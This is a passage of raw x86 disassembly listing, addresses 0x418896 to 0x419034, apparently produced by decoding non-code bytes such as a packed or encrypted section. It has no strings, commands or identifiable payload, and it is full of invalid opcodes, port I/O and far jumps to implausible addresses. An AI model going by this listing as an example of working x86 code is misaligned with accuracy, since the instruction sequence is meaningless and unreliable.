  418896:	imul   edx,DWORD PTR [edx+0x44ce9e3e],0x8e16c100
  4188a0:	mov    ebx,0x888cce52
  4188a5:	sub    al,BYTE PTR [ebx-0x38edb2a4]
  4188ab:	mov    ebp,0xc65705d7
  4188b0:	jnp    0x4188ff
  4188b2:	push   eax
  4188b3:	retf   
  4188b4:	out    dx,al
  4188b5:	adc    DWORD PTR [ebx+ebp*2],esp
  4188b8:	(bad)  
  4188b9:	cmp    ah,ah
  4188bb:	out    dx,al
  4188bc:	and    DWORD PTR [ebx-0x68bcff87],esp
  4188c2:	test   esi,edx
  4188c4:	aas    
  4188c5:	inc    eax
  4188c6:	stc    
  4188c7:	inc    esi
  4188c8:	sub    dl,ch
  4188ca:	stc    
  4188cb:	in     eax,0x54
  4188cd:	or     DWORD PTR [esi+eiz*1+0x7b6f2ccb],esi
  4188d4:	cld    
  4188d5:	xchg   esi,eax
  4188d6:	scas   al,BYTE PTR es:[edi]
  4188d7:	inc    edi
  4188d8:	in     al,0x7f
  4188da:	adc    DWORD PTR [ebx+0x52],ebp
  4188dd:	jle    0x4188e5
  4188df:	jmp    0x473adaff
  4188e4:	cmp    eax,DWORD PTR [ecx]
  4188e6:	inc    ebx
  4188e7:	inc    ebx
  4188e8:	mov    dh,BYTE PTR [edi+0x5ee54b85]
  4188ee:	or     DWORD PTR [edx],esi
  4188f0:	aam    0x8c
  4188f2:	popf   
  4188f3:	cmp    DWORD PTR [ebx-0x5f],0x1f4a6945
  4188fa:	pop    edx
  4188fb:	add    BYTE PTR [esi-0x5f564e7a],bl
  418901:	das    
  418902:	test   al,0x3f
  418904:	mov    edi,0x89b9626e
  418909:	mov    ds:0xe6f28ae3,eax
  41890e:	mov    esp,0xeb6324f8
  418913:	push   edx
  418914:	dec    ebx
  418915:	mov    ebx,eax
  418917:	scas   al,BYTE PTR es:[edi]
  418918:	sub    DWORD PTR [ecx],0x6f32b7cb
  41891e:	push   ss
  41891f:	sbb    DWORD PTR [edx+0x3a],esp
  418922:	sub    BYTE PTR [edx],ch
  418924:	jb     0x418900
  418926:	push   ss
  418927:	nop
  418928:	test   ah,dl
  41892a:	sbb    al,0x39
  41892c:	not    esi
  41892e:	leave  
  41892f:	or     ebp,edi
  418931:	push   0x8ccd373
  418936:	inc    ecx
  418937:	enter  0x2c3f,0xc
  41893b:	or     eax,0x81847
  418940:	scas   al,BYTE PTR es:[edi]
  418941:	mov    ah,0xb7
  418943:	push   ebx
  418944:	mov    edi,0xc298c63a
  418949:	arpl   WORD PTR [ebp+0x1f1ad72e],ax
  41894f:	(bad)  
  418950:	and    dl,al
  418952:	add    DWORD PTR [edi+0x2a],eax
  418955:	xor    DWORD PTR [ecx],ecx
  418957:	fimul  DWORD PTR [ecx]
  418959:	aad    0x5a
  41895b:	mov    dh,0x5b
  41895d:	and    eax,0x89c02c62
  418962:	cmp    cl,BYTE PTR [ecx+0x68]
  418965:	scas   eax,DWORD PTR es:[edi]
  418966:	inc    ecx
  418967:	pop    ds
  418968:	outs   dx,BYTE PTR ds:[esi]
  418969:	test   eax,0x2af17e35
  41896e:	inc    ebx
  41896f:	jo     0x4189ce
  418971:	inc    ebx
  418972:	push   cs
  418973:	sbb    al,0x4d
  418975:	call   0x1935b39b
  41897a:	sbb    eax,esi
  41897c:	jl     0x4189ed
  41897e:	fidivr DWORD PTR [edi]
  418980:	xchg   DWORD PTR [eax],edi
  418982:	nop
  418983:	cmc    
  418984:	xchg   ecx,eax
  418985:	and    esi,ebx
  418987:	addr16 mov al,ds:0xa411
  41898b:	(bad)
  41898f:	ins    BYTE PTR es:[edi],dx
  418990:	loope  0x418a01
  418992:	loope  0x41897d
  418994:	mov    esi,0xe53a913e
  418999:	loop   0x4189bd
  41899b:	int    0x13
  41899d:	aaa    
  41899e:	jo     0x418a03
  4189a0:	cwde   
  4189a1:	and    eax,0xf501497e
  4189a6:	dec    ebx
  4189a7:	pop    edx
  4189a8:	jl     0x418970
  4189aa:	out    0x6d,al
  4189ac:	js     0x41894f
  4189ae:	pop    ebp
  4189af:	les    ecx,FWORD PTR [edx+0x6b0d32db]
  4189b5:	(bad)  
  4189b6:	andps  xmm3,xmm3
  4189b9:	jmp    0x418972
  4189bb:	pushf  
  4189bc:	push   ebp
  4189bd:	adc    al,BYTE PTR [edi+0xc]
  4189c0:	add    bh,BYTE PTR [ebx-0x19708b96]
  4189c6:	in     eax,dx
  4189c7:	jne    0x418965
  4189c9:	icebp  
  4189ca:	jne    0x4189b0
  4189cc:	sub    ecx,DWORD PTR [ebx+0x44]
  4189cf:	mov    bh,BYTE PTR [ebx]
  4189d1:	test   esp,eax
  4189d3:	ja     0x4189d1
  4189d5:	in     eax,0x33
  4189d7:	aaa    
  4189d8:	add    edi,edx
  4189da:	sub    ebp,ebp
  4189dc:	dec    ecx
  4189dd:	pop    ss
  4189de:	mov    dh,0xfd
  4189e0:	lds    esp,FWORD PTR [ecx+0x5f]
  4189e3:	div    DWORD PTR [ebp-0x13]
  4189e6:	(bad)  
  4189e8:	shl    esp,1
  4189ea:	fld    TBYTE PTR [edi-0x10]
  4189ed:	(bad)  
  4189ee:	sub    ecx,ecx
  4189f0:	repnz in eax,0x76
  4189f3:	imul   ecx,DWORD PTR [ecx],0x3b6589bf
  4189f9:	cmp    dh,BYTE PTR [edi+eax*2+0x63]
  4189fd:	dec    ecx
  4189fe:	ret    0x4ab1
  418a01:	daa    
  418a02:	mov    BYTE PTR [ebx],0x63
  418a05:	icebp  
  418a06:	add    eax,DWORD PTR [ebx]
  418a08:	xor    BYTE PTR [edi-0x1],ch
  418a0b:	mov    DWORD PTR [esi],eax
  418a0d:	(bad)  
  418a0e:	xor    al,0x5a
  418a10:	arpl   WORD PTR [eax+0x2a],si
  418a13:	mov    al,0xa4
  418a15:	add    al,0x90
  418a17:	shl    BYTE PTR [edx],cl
  418a19:	mov    ecx,0x23b1323d
  418a1e:	(bad)  [ecx-0xb]
  418a21:	clc    
  418a22:	xchg   BYTE PTR ds:0x2cb46ca9,ah
  418a28:	retf   
  418a29:	dec    ecx
  418a2a:	popa   
  418a2b:	test   DWORD PTR [eax-0x65],ebx
  418a2e:	inc    esi
  418a2f:	mov    cl,0xbe
  418a32:	mov    dl,0xe9
  418a34:	lds    ebp,FWORD PTR [ebx]
  418a36:	fsubr  DWORD PTR [eax+0x39]
  418a39:	mov    ch,0x67
  418a3b:	iret   
  418a3c:	jo     0x4189c7
  418a3e:	pop    ebx
  418a3f:	mov    cs,WORD PTR [esi+0x21]
  418a42:	es xor al,0xad
  418a45:	sub    ebx,DWORD PTR [eax]
  418a47:	out    0xcb,eax
  418a49:	rol    edi,cl
  418a4b:	xchg   ecx,eax
  418a4c:	push   ecx
  418a4d:	icebp  
  418a4e:	pop    esi
  418a4f:	jmp    0x418a69
  418a51:	idiv   BYTE PTR [ecx-0x25f5cbad]
  418a57:	inc    edi
  418a58:	xor    bh,dl
  418a5a:	icebp  
  418a5b:	loope  0x4189dd
  418a5d:	pop    ss
  418a5e:	call   DWORD PTR [ecx+0x59]
  418a61:	push   ss
  418a62:	cld    
  418a63:	aas    
  418a64:	pop    edi
  418a65:	jo     0x418a75
  418a67:	clc    
  418a68:	cmp    DWORD PTR [esi-0x6c00e92c],ebp
  418a6e:	pop    ss
  418a6f:	cmovp  esp,DWORD PTR [edi+0x56b07785]
  418a76:	mov    BYTE PTR [ebp-0x64],bl
  418a79:	cmovae edi,DWORD PTR [esi+0x170c63a8]
  418a80:	push   ebp
  418a81:	add    al,0x67
  418a83:	stc    
  418a84:	call   0xbfd8:0x99677144
  418a8b:	repnz and BYTE PTR [ebx],dl
  418a8e:	sar    DWORD PTR [edx+0x5cc3da86],0x10
  418a95:	addr16 mov ecx,0x822427c4
  418a9b:	iret   
  418a9c:	adc    eax,0x2d6c00eb
  418aa1:	out    dx,eax
  418aa2:	xchg   edx,eax
  418aa3:	adc    BYTE PTR [ebp-0x40],al
  418aa6:	xchg   edi,eax
  418aa7:	int3   
  418aa8:	push   0x29
  418aaa:	test   bl,0xdd
  418aad:	jecxz  0x418a3f
  418aaf:	mov    BYTE PTR [ebp-0x16],bl
  418ab2:	mov    dh,0xa1
  418ab4:	int3   
  418ab5:	in     al,0x11
  418ab7:	xor    eax,0xdacb117c
  418abc:	pop    esi
  418abd:	mov    dl,0xfb
  418abf:	out    dx,al
  418ac0:	xchg   esp,eax
  418ac1:	pop    esi
  418ac2:	popa   
  418ac3:	pop    ebp
  418ac4:	inc    edx
  418ac5:	xor    al,0xf7
  418ac7:	inc    esp
  418ac8:	mov    ecx,0xef6b9618
  418acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ace:	push   cs
  418acf:	(bad)  
  418ad0:	outs   dx,DWORD PTR ds:[esi]
  418ad1:	aas    
  418ad2:	into   
  418ad3:	sbb    BYTE PTR [ebp+0x7c375c6a],ch
  418ad9:	leave  
  418ada:	jg     0x418b59
  418adc:	and    al,0x88
  418ade:	dec    eax
  418adf:	pop    esi
  418ae0:	aad    0x14
  418ae2:	push   ebx
  418ae3:	mov    DWORD PTR [ecx],ebp
  418ae5:	xor    dl,BYTE PTR [esi+0x60]
  418ae8:	cli    
  418ae9:	mul    BYTE PTR [eax-0x2e]
  418aec:	sub    eax,0x91899ac9
  418af1:	mov    ds:0x8933639b,al
  418af6:	pop    ebx
  418af7:	jb     0x418b55
  418af9:	shl    BYTE PTR [edi-0x55],cl
  418afc:	lahf   
  418afd:	psllq  mm3,QWORD PTR [ecx-0x6090bb00]
  418b04:	xchg   ebp,eax
  418b05:	mov    bh,0x82
  418b07:	fdivrp st(2),st
  418b09:	inc    ebx
  418b0a:	push   ds
  418b0b:	(bad)  
  418b0c:	pusha  
  418b0d:	dec    ecx
  418b0e:	and    DWORD PTR [edx+0x2c04aaf4],ebx
  418b14:	add    ecx,ebx
  418b16:	out    dx,eax
  418b17:	retf   0x18ae
  418b1a:	inc    edx
  418b1b:	test   al,0xa4
  418b1d:	out    dx,al
  418b1e:	in     eax,0x6e
  418b20:	mov    esp,0xf7ba37f
  418b25:	mov    edi,0xb13370dc
  418b2a:	stos   DWORD PTR es:[edi],eax
  418b2b:	push   esp
  418b2c:	inc    ebp
  418b2d:	adc    DWORD PTR [esi],esi
  418b2f:	(bad)  
  418b30:	or     BYTE PTR [esi-0x74],dl
  418b33:	adc    al,0x7d
  418b35:	add    dh,BYTE PTR [eax-0xae6e564]
  418b3b:	dec    ebx
  418b3c:	xor    dl,BYTE PTR [esi-0x5e]
  418b3f:	jge    0x418b86
  418b41:	xor    ebx,edx
  418b43:	fwait
  418b44:	cs mul al
  418b47:	add    al,0x1
  418b49:	es dec ebx
  418b4b:	jbe    0x418bc5
  418b4d:	mov    ch,0xab
  418b4f:	neg    DWORD PTR [ecx-0x75f9b44b]
  418b55:	push   ds
  418b56:	fimul  WORD PTR [edi]
  418b58:	and    BYTE PTR [edi+0x48],dh
  418b5b:	and    esi,ecx
  418b5d:	xchg   ecx,eax
  418b5e:	pop    eax
  418b5f:	and    DWORD PTR gs:[edi+0x2f13089e],edx
  418b66:	sub    eax,0x3674c4f7
  418b6b:	inc    esp
  418b6c:	jge    0x418be9
  418b6e:	addr16 cmp al,0x53
  418b71:	cmp    bh,BYTE PTR [esi]
  418b73:	mov    bh,0xb7
  418b75:	pusha  
  418b76:	xor    al,0x3a
  418b78:	pusha  
  418b79:	repz jl 0x418b61
  418b7c:	mov    al,0xf8
  418b7e:	dec    ecx
  418b7f:	mov    ds:0x7fcef6ee,eax
  418b84:	in     al,dx
  418b85:	adc    edi,esi
  418b87:	and    DWORD PTR [edi+0x3aba79bd],eax
  418b8d:	clc    
  418b8e:	clc    
  418b8f:	add    DWORD PTR [edi],0x51
  418b92:	inc    esp
  418b93:	adc    dl,BYTE PTR [ebx]
  418b95:	jbe    0x418b9e
  418b97:	clc    
  418b98:	outs   dx,BYTE PTR ds:[esi]
  418b99:	xor    dl,BYTE PTR [edx-0x31]
  418b9c:	sbb    eax,0x7bd540f8
  418ba1:	aam    0x22
  418ba3:	push   cs
  418ba4:	sub    bh,bl
  418ba6:	xchg   ebx,eax
  418ba7:	pop    ebp
  418ba8:	fild   WORD PTR [ebx-0x3bd08b25]
  418bae:	xor    DWORD PTR [ebx],esi
  418bb0:	xor    ecx,ecx
  418bb2:	jp     0x418b5e
  418bb4:	pop    ss
  418bb5:	daa    
  418bb6:	sti    
  418bb7:	sbb    BYTE PTR [edi-0x7254a1dd],ah
  418bbd:	push   eax
  418bbe:	iret   
  418bbf:	and    al,0x9a
  418bc1:	mov    esp,0x2ecf88fd
  418bc6:	and    DWORD PTR [esi],esp
  418bc8:	mov    bh,0xfc
  418bca:	push   edx
  418bcb:	lock jmp FWORD PTR [ecx-0x745db91b]
  418bd2:	pop    ebp
  418bd3:	popf   
  418bd4:	fmul   DWORD PTR [eax-0x4e]
  418bd7:	imul   ecx,DWORD PTR [esi-0x72],0x60
  418bdb:	xchg   ecx,eax
  418bdc:	push   ss
  418bdd:	mov    dl,0x7
  418bdf:	ss (bad) 
  418be1:	sahf   
  418be2:	fwait
  418be3:	(bad)  
  418be4:	adc    ah,BYTE PTR [ebx-0x74e23068]
  418bea:	das    
  418beb:	into   
  418bec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bed:	or     al,BYTE PTR [ebx+ecx*1]
  418bf0:	pop    esi
  418bf1:	sbb    al,0xd4
  418bf3:	dec    edi
  418bf4:	cmc    
  418bf5:	jo     0x418c2d
  418bf7:	xor    DWORD PTR [esi],0x9bdc3d52
  418bfd:	dec    eax
  418bfe:	cdq    
  418bff:	rol    BYTE PTR [edx-0x74ea68fd],0x52
  418c06:	(bad)  
  418c08:	sahf   
  418c09:	mov    ecx,0xdaa62ba1
  418c0e:	sti    
  418c0f:	adc    dl,bl
  418c11:	pop    ebx
  418c12:	int    0x77
  418c14:	sub    bl,BYTE PTR [eax+ecx*4+0x62]
  418c18:	sub    BYTE PTR [eax+0x2d],0x95
  418c1c:	fdivr  DWORD PTR [edi-0x7c6433c6]
  418c22:	add    edx,edx
  418c24:	push   ebx
  418c25:	jmp    0xc25ad085
  418c2a:	pushf  
  418c2b:	dec    eax
  418c2c:	popa   
  418c2d:	mov    esi,DWORD PTR [eax-0x1ae882be]
  418c33:	or     BYTE PTR [eax+0x76],dl
  418c36:	arpl   WORD PTR [edi+0x45],di
  418c39:	fbld   TBYTE PTR [esi]
  418c3b:	(bad)  
  418c3d:	bound  edi,QWORD PTR [edx-0x20]
  418c40:	inc    esp
  418c41:	pop    esi
  418c42:	pusha  
  418c43:	push   ebp
  418c44:	fst    QWORD PTR [edx-0x7a22243]
  418c4a:	aad    0xf
  418c4c:	shr    bl,cl
  418c4e:	adc    dl,al
  418c50:	fidiv  WORD PTR [eax+0x5ff3b918]
  418c56:	mov    edx,0x3268c846
  418c5b:	sbb    esp,ebx
  418c5d:	je     0x418c9c
  418c5f:	inc    ebp
  418c60:	xor    al,0x20
  418c62:	inc    ecx
  418c63:	aad    0x27
  418c65:	mov    esi,0xeffa7a07
  418c6a:	bound  ebx,QWORD PTR [ebx]
  418c6c:	jno    0x418bfb
  418c6e:	repnz pop eax
  418c70:	xchg   ebp,eax
  418c71:	inc    esi
  418c72:	jge    0x418ce7
  418c74:	mov    al,0x18
  418c76:	cmc    
  418c77:	xlat   BYTE PTR ds:[ebx]
  418c78:	mov    eax,0xf0ed25f9
  418c7d:	out    dx,al
  418c7e:	mov    ecx,0x68f80cc
  418c83:	push   eax
  418c84:	jne    0x418c37
  418c86:	outs   dx,BYTE PTR ds:[esi]
  418c87:	jns    0x418c60
  418c89:	pop    ds
  418c8a:	adc    ecx,DWORD PTR [esi-0x62]
  418c8d:	cmp    al,0x9c
  418c8f:	xchg   ebp,eax
  418c90:	inc    edi
  418c91:	arpl   WORD PTR [edx],di
  418c93:	sbb    ecx,DWORD PTR [ebx]
  418c95:	ins    DWORD PTR es:[edi],dx
  418c96:	mov    es,WORD PTR [esi+0x56]
  418c99:	xlat   BYTE PTR fs:[ebx]
  418c9b:	push   esi
  418c9c:	paddsw mm5,QWORD PTR [esi+0x6e]
  418ca0:	cmc    
  418ca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ca2:	int3   
  418ca3:	mov    cl,0x3a
  418ca5:	cmp    eax,0x9ff22319
  418caa:	xchg   ebx,eax
  418cab:	fsubr  DWORD PTR [ebx+0x2d6f8c49]
  418cb1:	out    dx,al
  418cb2:	pushf  
  418cb3:	mov    ah,0xb5
  418cb5:	add    ch,al
  418cb7:	aas    
  418cb8:	iret   
  418cb9:	imul   ecx,esi,0x8326f5b0
  418cbf:	das    
  418cc0:	push   esi
  418cc1:	loope  0x418d31
  418cc3:	xchg   esi,eax
  418cc4:	sbb    al,0xc9
  418cc6:	xchg   BYTE PTR [eax+0x488ace68],ch
  418ccc:	lea    ebx,[ebp-0x1f]
  418ccf:	(bad)  
  418cd0:	arpl   bx,bp
  418cd2:	mov    edx,DWORD PTR [esp+eiz*2]
  418cd5:	mov    ebp,0xbfe90363
  418cda:	fisttp WORD PTR [edi-0x25714e4f]
  418ce0:	mov    ds:0xebb76fff,eax
  418ce5:	mov    cs,edi
  418ce7:	ror    DWORD PTR [eax+0x35],1
  418cea:	cmp    BYTE PTR [edx+0x6869f3e9],bl
  418cf0:	xor    eax,0x3ecd0661
  418cf5:	shl    esp,0x22
  418cf8:	adc    bh,ch
  418cfa:	stos   BYTE PTR es:[edi],al
  418cfb:	xor    eax,0x21304c24
  418d00:	mov    dl,0x36
  418d02:	mov    ah,0xe1
  418d04:	std    
  418d05:	shl    DWORD PTR [esp+eax*4-0x46],0xe4
  418d0a:	jp     0x418d65
  418d0c:	aaa    
  418d0d:	mov    esi,0x69390c5b
  418d12:	pop    esi
  418d13:	inc    esp
  418d14:	ret    0xaea6
  418d17:	cmp    cl,BYTE PTR [edi+0xec6d167]
  418d1d:	fcmovb st,st(1)
  418d1f:	aad    0x78
  418d21:	out    0x13,al
  418d23:	xor    dh,BYTE PTR [ebp+edi*1-0x13]
  418d27:	add    cl,BYTE PTR [ecx+0x24e8656b]
  418d2d:	les    esi,FWORD PTR [edx]
  418d2f:	xchg   ecx,eax
  418d30:	pushf  
  418d31:	push   eax
  418d32:	(bad)  
  418d33:	loopne 0x418cf8
  418d35:	jle    0x418d15
  418d37:	lods   eax,DWORD PTR ds:[esi]
  418d38:	inc    edi
  418d39:	push   edx
  418d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d3b:	inc    eax
  418d3c:	cld    
  418d3d:	inc    esp
  418d3e:	in     eax,0xd4
  418d40:	stc    
  418d41:	dec    edx
  418d42:	test   BYTE PTR [ebp-0x21ab885a],bl
  418d48:	pop    ebp
  418d49:	retf   0x28d6
  418d4c:	mov    bh,0x38
  418d4e:	test   esp,0xa065f1a8
  418d54:	mov    DWORD PTR [eax+ecx*1+0x3e],esp
  418d58:	adc    BYTE PTR [esi+0x55],bl
  418d5b:	push   0x68263128
  418d60:	xor    esi,DWORD PTR [ecx-0x4c3e4c65]
  418d66:	test   eax,0x22ccac2
  418d6b:	jl     0x418cfb
  418d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d6e:	hlt    
  418d6f:	imul   esp,DWORD PTR [ebx],0x4f3f2c5d
  418d75:	ror    BYTE PTR [edx-0x5f15f577],0x3
  418d7c:	cmp    al,0x81
  418d7e:	xchg   ebx,eax
  418d7f:	inc    esp
  418d80:	sbb    ebp,edi
  418d82:	xor    al,0x22
  418d84:	cwde   
  418d85:	xor    dh,dh
  418d87:	mov    bh,BYTE PTR [esi+0x7]
  418d8a:	das    
  418d8b:	mov    DWORD PTR [esi],edi
  418d8d:	adc    DWORD PTR [edx+0x5f],0x14
  418d91:	mov    dh,0x9c
  418d93:	ins    DWORD PTR es:[edi],dx
  418d94:	pop    esp
  418d95:	repnz jecxz 0x418d74
  418d98:	dec    edx
  418d99:	fmul   st,st(6)
  418d9b:	sbb    dl,BYTE PTR [edx+0x1262b484]
  418da1:	or     al,0x14
  418da3:	inc    edx
  418da4:	xchg   DWORD PTR [eax+0x1c],eax
  418da7:	xor    al,0xbd
  418da9:	dec    eax
  418daa:	out    dx,eax
  418dab:	push   esi
  418dac:	mov    WORD PTR [edx-0x6832a7a7],ss
  418db2:	pop    eax
  418db3:	in     eax,0x3a
  418db5:	xor    BYTE PTR [edi-0x6d],cl
  418db8:	mov    ds:0x9cbcaef4,al
  418dbd:	mov    ds:0xa2e6057d,eax
  418dc2:	arpl   WORD PTR [esi-0x27b85f71],sp
  418dc8:	ror    cl,cl
  418dca:	mov    ss,WORD PTR [eax-0x1a]
  418dcd:	std    
  418dce:	jne    0x418e23
  418dd0:	lahf   
  418dd1:	xor    eax,ebx
  418dd3:	and    BYTE PTR [esi],bl
  418dd5:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  418dd7:	xchg   ebx,eax
  418dd8:	mov    ah,BYTE PTR [ecx-0x22]
  418ddb:	addr16 pop esp
  418ddd:	or     DWORD PTR [ecx-0x63ebe2ae],ebp
  418de3:	ror    BYTE PTR [edx-0x25],0xb7
  418de7:	imul   ebp,DWORD PTR [eax-0x446af37e],0x2370d458
  418df1:	mov    ebx,0x575d2505
  418df6:	pop    ebp
  418df7:	sbb    eax,0xb815a612
  418dfc:	popa   
  418dfd:	out    0x32,al
  418dff:	lods   eax,DWORD PTR ds:[esi]
  418e00:	retf   0x5213
  418e03:	inc    ecx
  418e04:	adc    BYTE PTR [edi+0x2c],0xd2
  418e08:	inc    ebp
  418e09:	fs cmp eax,0xf2d499f5
  418e0f:	mov    dh,0xfb
  418e11:	xchg   esp,eax
  418e12:	jo     0x418e53
  418e14:	je     0x418e09
  418e16:	mov    bh,0xaa
  418e18:	sub    BYTE PTR [edi],bl
  418e1a:	xlat   BYTE PTR ds:[ebx]
  418e1b:	sti    
  418e1c:	stos   DWORD PTR es:[edi],eax
  418e1d:	sbb    al,BYTE PTR [ecx+0x2e]
  418e20:	sub    BYTE PTR [edx+0x769efd4],0x1f
  418e27:	cmp    dh,dl
  418e29:	jmp    0x301f:0xe510b7d1
  418e30:	dec    esi
  418e31:	pop    esp
  418e32:	popa   
  418e33:	div    BYTE PTR [esi+0x4e]
  418e36:	test   BYTE PTR [eax+0x35],0x9d
  418e3a:	dec    esi
  418e3b:	cmp    al,0xac
  418e3d:	icebp  
  418e3e:	mov    al,BYTE PTR [esp+ecx*1+0x4b277fd3]
  418e45:	ins    DWORD PTR es:[edi],dx
  418e46:	cmp    ah,bl
  418e48:	fist   WORD PTR [ecx+0x39796141]
  418e4e:	push   esi
  418e4f:	ins    BYTE PTR es:[edi],dx
  418e50:	xor    eax,0x998fe846
  418e55:	psubq  mm4,QWORD PTR [edx+esi*1]
  418e59:	pop    ss
  418e5a:	loopne 0x418e3a
  418e5c:	inc    ebx
  418e5d:	jno    0x418ea0
  418e5f:	push   0x38
  418e61:	lahf   
  418e62:	test   DWORD PTR ds:0x79fd3ee9,0xd7d6a7e5
  418e6c:	mov    eax,ds:0xe9721971
  418e71:	and    DWORD PTR [esi-0x687e143a],0x4e
  418e78:	js     0x418e98
  418e7a:	or     dh,BYTE PTR [ebx+0xef1417]
  418e80:	shl    BYTE PTR [ebx+edi*2+0x77],cl
  418e84:	cmp    cl,dl
  418e86:	adc    BYTE PTR [edi+0x26fa2aea],dh
  418e8c:	dec    edx
  418e8d:	test   edx,edi
  418e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e90:	inc    ecx
  418e91:	cdq    
  418e92:	jnp    0x418e41
  418e94:	test   BYTE PTR [ecx-0x745dac7d],dh
  418e9a:	pop    edx
  418e9b:	jmp    0xad44aa82
  418ea0:	pop    es
  418ea1:	sub    eax,0x972f1866
  418ea6:	test   DWORD PTR [eax],esp
  418ea8:	pop    ds
  418ea9:	mov    ds:0xb7c8d01,al
  418eae:	neg    ebx
  418eb0:	cmp    edi,DWORD PTR [eax-0x61]
  418eb3:	cmp    DWORD PTR ds:0x65d267de,eax
  418eb9:	pop    ebx
  418eba:	out    0x1b,eax
  418ebc:	jo     0x418efa
  418ebe:	and    BYTE PTR [esi],ah
  418ec0:	xor    edx,ebx
  418ec2:	mov    ebx,0x9c92f1c7
  418ec7:	aad    0xd1
  418ec9:	ret    
  418eca:	(bad)  
  418ecb:	mov    al,0x86
  418ecd:	fs jnp 0x418f17
  418ed0:	mul    BYTE PTR [esi+edi*8-0x13]
  418ed4:	and    ah,BYTE PTR [ebx+0x73e2af55]
  418eda:	popf   
  418edb:	mov    ecx,0x874d8654
  418ee0:	mov    ebx,0x38b55e69
  418ee5:	push   es
  418ee6:	cmp    ah,bl
  418ee8:	fld    TBYTE PTR [ebx-0x24]
  418eeb:	mov    ah,0xf6
  418eed:	mov    al,ds:0x8c6325d4
  418ef2:	sub    eax,eax
  418ef4:	pop    esp
  418ef5:	adc    DWORD PTR [eax+0x32a81fdf],ebp
  418efb:	dec    edx
  418efc:	inc    ebp
  418efd:	mov    ecx,0xc02f7cc6
  418f02:	ja     0x418e99
  418f04:	sbb    DWORD PTR [ecx-0x1284b6f5],edi
  418f0a:	xchg   esp,eax
  418f0b:	xor    BYTE PTR [esi-0x34],ah
  418f0e:	mov    ecx,0x27e38025
  418f13:	(bad)  [ebp+eax*2+0x15]
  418f17:	pop    ebp
  418f18:	pop    ecx
  418f19:	inc    edx
  418f1a:	push   0x77b18d33
  418f1f:	jl     0x418f33
  418f21:	idiv   DWORD PTR [ebx]
  418f23:	call   0xe4c8:0x166bb699
  418f2a:	in     al,dx
  418f2b:	mov    cl,0x96
  418f2d:	ficomp WORD PTR [ecx]
  418f2f:	cmp    esi,DWORD PTR [edx+ebx*1]
  418f32:	inc    esp
  418f33:	inc    edi
  418f34:	je     0x418f8a
  418f36:	pushf  
  418f37:	adc    eax,0xec8246ac
  418f3c:	push   edx
  418f3d:	sbb    BYTE PTR ds:0xc837293c,ch
  418f43:	test   bl,ch
  418f45:	prefetch (bad)
  418f46:	or     eax,0x8d8f3cf1
  418f4b:	div    ch
  418f4d:	popf   
  418f4e:	cwde   
  418f4f:	jne    0x418f20
  418f51:	lock add eax,0x1391d842
  418f57:	loopne 0x418f9b
  418f59:	mov    edx,0x784b6bb7
  418f5e:	fxch   st(2)
  418f60:	fild   QWORD PTR [edx]
  418f62:	xor    BYTE PTR [esi],bl
  418f64:	pusha  
  418f65:	enter  0x980,0x2d
  418f69:	mov    edx,0x2069d06e
  418f6e:	add    dh,BYTE PTR [edx+0x6e]
  418f71:	aad    0xeb
  418f73:	ins    DWORD PTR es:[edi],dx
  418f74:	fst    QWORD PTR [eax]
  418f76:	ret    
  418f77:	mov    edi,0x4e6959b1
  418f7c:	jmp    0x329cda10
  418f81:	pop    esi
  418f82:	or     al,0x1c
  418f84:	fwait
  418f85:	cmp    eax,0x8147c982
  418f8a:	jmp    0x418fa7
  418f8c:	es inc ecx
  418f8e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  418f90:	scas   eax,DWORD PTR es:[edi]
  418f91:	clc    
  418f92:	scas   eax,DWORD PTR es:[edi]
  418f93:	pop    eax
  418f94:	pop    ss
  418f95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f96:	xor    eax,DWORD PTR [edx+0x1a0dd295]
  418f9c:	jecxz  0x419012
  418f9e:	ret    0xc1e9
  418fa1:	xchg   ch,ah
  418fa3:	adc    ecx,DWORD PTR [ebp+0x10]
  418fa6:	jae    0x41901d
  418fa8:	aam    0xd
  418faa:	dec    ebx
  418fab:	add    DWORD PTR [ecx],0x7169daee
  418fb1:	mov    cl,0x89
  418fb3:	sub    al,0x78
  418fb5:	inc    edx
  418fb6:	pop    ecx
  418fb7:	xor    edi,esi
  418fb9:	nop
  418fba:	pop    esp
  418fbb:	ror    cl,0xd4
  418fbe:	clc    
  418fbf:	and    bl,bl
  418fc1:	(bad)  
  418fc2:	pop    esi
  418fc3:	pop    ebx
  418fc4:	xchg   edi,eax
  418fc5:	dec    edi
  418fc6:	inc    eax
  418fc7:	xor    eax,0x2bcf366f
  418fcc:	enter  0x3790,0xff
  418fd0:	jp     0x418fa3
  418fd2:	shr    DWORD PTR cs:[esi-0x6a],1
  418fd6:	cli    
  418fd7:	jnp    0x418f87
  418fd9:	mov    ch,0xed
  418fdb:	mov    ecx,0x8721dc7a
  418fe0:	pop    esp
  418fe1:	mov    WORD PTR [edx+edx*8-0x2cb9d84d],ss
  418fe8:	xchg   ebp,eax
  418fe9:	sub    eax,edi
  418feb:	iret   
  418fec:	sbb    BYTE PTR ds:0xfd8b75d,ch
  418ff2:	jb     0x418fdc
  418ff4:	lods   eax,DWORD PTR ds:[esi]
  418ff5:	into   
  418ff6:	xor    eax,0x22f16844
  418ffb:	rcl    ebx,0x4a
  418ffe:	dec    esp
  418fff:	scas   al,BYTE PTR es:[edi]
  419000:	fs pushf 
  419002:	nop
  419003:	in     al,0x5b
  419005:	repz iret 
  419007:	mov    ah,0x46
  419009:	jmp    0x418fb2
  41900b:	xor    al,0xb1
  41900d:	repz adc DWORD PTR [ebx+0x46],esi
  419011:	cmp    eax,0xe6c87466
  419016:	jmp    0x418fc5
  419018:	xchg   edx,eax
  419019:	loope  0x418ff0
  41901b:	sar    DWORD PTR [ebx],cl
  41901d:	pushf  
  41901e:	add    al,BYTE PTR [edi+esi*2]
  419021:	lds    esi,FWORD PTR [ebx-0x46]
  419024:	fist   WORD PTR [ebx]
  419026:	push   ds
  419027:	call   0x8a2e:0x9ad349d4
  41902e:	mov    ss,WORD PTR [edi-0xfffac6]
  419034:	addr16 mov edi,0x42e2b735
